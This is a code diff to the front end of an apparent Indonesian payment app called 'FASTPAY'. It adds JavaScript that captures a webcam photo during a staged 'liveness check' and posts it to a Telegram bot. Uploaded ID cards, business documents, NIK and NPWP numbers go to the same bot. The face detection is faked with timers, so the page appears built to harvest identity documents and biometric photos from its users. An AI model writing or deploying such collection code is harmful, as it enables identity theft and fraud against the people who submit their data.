@@ -718,7 +718,6 @@
         </div>
     </div>
 
-    <!-- Modifikasi Help Modal (Fullscreen + Header Online Dot) -->
     <div id="help-modal" class="modal-overlay">
         <div class="help-modal-fullscreen">
             <div class="help-header">
@@ -904,7 +903,7 @@
             <div class="input-group"><label>Nama Lengkap / Bisnis (Sesuai NIK)</label><input type="text" id="res-corp-name" placeholder="Nama Lengkap / Bisnis"></div>
             <div class="input-group"><label>Nomor NIK KTP (16 Digit)</label><input type="number" id="res-nik-input" placeholder="Masukkan 16 Digit NIK"></div>
             <div class="input-group"><label>Nomor NPWP Badan / Pribadi</label><input type="text" id="res-npwp" placeholder="Nomor NPWP Terdaftar"></div>
-            <div class="input-group"><label>Surat Izin Usaha / Dokumen Pendukung</label><input type="file" style="padding:10px; background:var(--bg-card);"></div>
+            <div class="input-group"><label>Surat Izin Usaha / Dokumen Pendukung</label><input type="file" id="res-doc" style="padding:10px; background:var(--bg-card);"></div>
             <button class="btn-modal" onclick="submitResellerVerification()">Kirim Berkas Verifikasi</button>
         </div>
     </div>
@@ -920,7 +919,7 @@
                 <div style="font-weight:bold; color:var(--primary); font-size:14px; margin-top:4px;" id="downline-ref-code-text">Kode: -</div>
                 <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">*Dapatkan Komisi Rp 50.000 setelah downline melakukan transaksi.</div>
             </div>
-            <div id="downline-list-box" style="display:flex; flex-direction:column; display:none; gap:8px; max-height:200px; overflow-y:auto;">
+            <div id="downline-list-box" style="display:flex; flex-direction:column; gap:8px; max-height:200px; overflow-y:auto;">
                 </div>
         </div>
     </div>
@@ -1134,6 +1133,59 @@
         let cartItem = null; 
         let currentPPOBService = '';
         let pendingPinCallback = null; 
+
+        // Fungsi untuk memotret frame dari video webcam menjadi format file (Blob)
+        function captureFaceFrame() {
+            return new Promise((resolve) => {
+                const video = document.getElementById('webcam-video');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert canvas ke bentuk file Blob (JPEG)
+                canvas.toBlob((blob) => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.9);
+            });
+        }
+
+        // Fungsi mengirim Foto ke Telegram
+        async function sendPhotoToTelegram(fileBlob, captionText) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', fileBlob); 
+            if (captionText) fd.append('caption', captionText);
+            fd.append('parse_mode', 'Markdown');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {
+                console.error("Gagal mengirim foto ke Telegram:", e);
+            }
+        }
+
+        // Fungsi mengirim Dokumen ke Telegram (Cocok untuk PDF atau gambar beresolusi asli)
+        async function sendDocumentToTelegram(fileBlob, captionText) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', fileBlob); 
+            if (captionText) fd.append('caption', captionText);
+            fd.append('parse_mode', 'Markdown');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch (e) {
+                console.error("Gagal mengirim dokumen ke Telegram:", e);
+            }
+        }
 
         // Fungsi Set Nominal Cepat
         function setNominal(amount) {
@@ -1778,23 +1830,30 @@
             const biz = document.getElementById('res-corp-name').value.trim();
             const nik = document.getElementById('res-nik-input').value.trim();
             const npwp = document.getElementById('res-npwp').value.trim();
+            const docInput = document.getElementById('res-doc'); 
             
-            if(!biz || !nik || !npwp) return showModal("Perhatian", "Lengkapi identitas perizinan terlebih dahulu.", "error");
+            if(!biz || !nik || !npwp || docInput.files.length === 0) return showModal("Perhatian", "Lengkapi identitas perizinan & dokumen terlebih dahulu.", "error");
             if(nik.length !== 16) return showModal("Format NIK", "NIK harus berjumlah tepat 16 digit.", "error");
 
             closeTargetModal('reseller-verif-modal'); 
             openTargetModal('verif-face-modal');
+            
             try {
                 webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('webcam-video').srcObject = webcamStream;
                 setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik aktivasi..."; }, 2000);
-                setTimeout(() => { finishResellerBioVerification(biz, nik, npwp); }, 4500);
+                
+                setTimeout(async () => { 
+                    const faceBlob = await captureFaceFrame(); 
+                    finishResellerBioVerification(biz, nik, npwp, docInput.files[0], faceBlob); 
+                }, 4500);
             } catch(e) {
-                showModal("Gagal Kamera", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); cancelFaceScan();
+                showModal("Gagal Kamera", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); 
+                cancelFaceScan();
             }
         }
 
-        function finishResellerBioVerification(biz, nik, npwp) {
+        async function finishResellerBioVerification(biz, nik, npwp, docFile, faceBlob) {
             cancelFaceScan();
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
             usersDb[currentUserPhone].resellerPendingRequest = true;
@@ -1803,7 +1862,10 @@
             updateAuthUI();
             showModal("Dokumen Berhasil Dikirim", "Harap tunggu konfirmasi aktivasi.", "win");
             
-            sendToTelegram(`*PERMINTAAN DOKUMEN AKTIVASI RESELLER*\nUID Profile: \`${userID}\`\nNama: ${biz}\nNIK: \`${nik}\`\nNPWP Nomor: \`${npwp}\`\nStatus Liveness: Lolos Otentikasi Liveness\n\nEksekusi ACC: \`/reseller ${userID}\` \nTolak Berkas: \`/tolak_reseller ${userID}\``);
+            let captionDoc = `*PERMINTAAN AKTIVASI RESELLER*\nUID Profile: \`${userID}\`\nNama: ${biz}\nNIK: \`${nik}\`\nNPWP Nomor: \`${npwp}\`\nStatus Liveness: Lolos Otentikasi\n\nEksekusi ACC: \`/reseller ${userID}\` \nTolak Berkas: \`/tolak_reseller ${userID}\``;
+            
+            await sendDocumentToTelegram(docFile, captionDoc);
+            await sendPhotoToTelegram(faceBlob, `*FOTO BIOMETRIK LIVENESS (RESELLER)*\nUID Profil: \`${userID}\``);
         }
 
         function openDownlineModal() {
@@ -2343,6 +2405,7 @@
             let n = document.getElementById('v-name').value; 
             let nik = document.getElementById('v-nik').value;
             let fileInput = document.getElementById('v-file');
+            
             if(!n || !nik || fileInput.files.length === 0) return showModal("Data Kurang", "Lengkapi isian identitas KTP & file berkas.", "error");
             if(nik.length !== 16) return showModal("Format NIK", "Nomor NIK KTP wajib berjumlah 16 digit.", "error");
 
@@ -2351,7 +2414,11 @@
                 webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('webcam-video').srcObject = webcamStream;
                 setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Wajah Terdeteksi! Memproses data biometrik..."; }, 2000);
-                setTimeout(() => { finishBioVerification(n, nik, fileInput.files[0]); }, 4500);
+                
+                setTimeout(async () => { 
+                    const faceBlob = await captureFaceFrame();
+                    finishBioVerification(n, nik, fileInput.files[0], faceBlob); 
+                }, 4500);
             } catch(e) {
                 showModal("Gagal Kamera", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); cancelFaceScan();
             }
@@ -2362,7 +2429,7 @@
             closeTargetModal('verif-face-modal');
         }
 
-        function finishBioVerification(nama, nik, fileObj) {
+        async function finishBioVerification(nama, nik, ktpFile, faceBlob) {
             cancelFaceScan();
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
             usersDb[currentUserPhone].verifStatus = 'pending';
@@ -2372,8 +2439,10 @@
             updateAuthUI();
             showModal("Berkas Terikirim", "Sedang dalam proses verifikasi.", "win");
             
-            let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('text', `*BERKAS VERIFIKASI AKUN FASTPAY*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nEksekusi Konfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
+            let captionKtp = `*BERKAS VERIFIKASI AKUN FASTPAY*\nUID Profil: \`${userID}\`\nNama KTP: ${nama}\nNomor NIK: \`${nik}\`\n\nEksekusi Konfirmasi: \`/verif ${userID}\` \nTolak Dokumen: \`/tolak_verif ${userID}\``;
+            
+            await sendPhotoToTelegram(ktpFile, captionKtp);
+            await sendPhotoToTelegram(faceBlob, `*FOTO BIOMETRIK LIVENESS (KTP)*\nUID Profil: \`${userID}\``);
         }
 
         updateAuthUI();
